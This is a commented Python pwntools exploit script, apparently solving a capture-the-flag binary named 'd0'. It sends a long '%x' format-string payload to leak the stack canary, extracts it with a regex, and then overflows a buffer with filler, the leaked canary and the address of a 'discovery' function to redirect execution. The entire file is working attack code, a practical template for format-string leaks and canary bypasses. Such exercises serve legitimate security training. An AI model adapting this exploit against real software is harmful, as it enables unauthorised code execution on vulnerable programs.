#Import pwntools and regular expressions
from pwn import *
import re

#Designate which elf we are using, and run it
target = process("./d0")
elf = ELF("./d0")
context(binary=elf)

#Send the format string exploit to leak the canary
target.sendline("%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%xesc%xape")

#Store the output of the format string memory leak
memleak = target.recvline()

#Parse out the canary from the rest of the memory leak
canary = str(re.findall(r'esc(.*?)ape', memleak))

#Remove excess characters, print and convert the canary to a hex string
canary = canary.replace("['", "")
canary = canary.replace("']", "")
canary = "0x" + canary
print "The Canary Is: " + canary
canary = int(canary, 16)

#Designate the first and second filler segments
filler0 = "0"*10
filler1 = "0"*12  

#Pull the symbol for the discovery function address
address = elf.symbols["discovery"]

#Construct the payload by combining the two filler segments, the canary and discovery address (in little endian)
payload = filler0 + p32(canary) + filler1 + p32(address)

#Send the payload (and print it)
print "Sending: " + str(payload)
target.sendline(payload)

#Print the program's output, which should include "Level Cleared!"
print target.recvline()


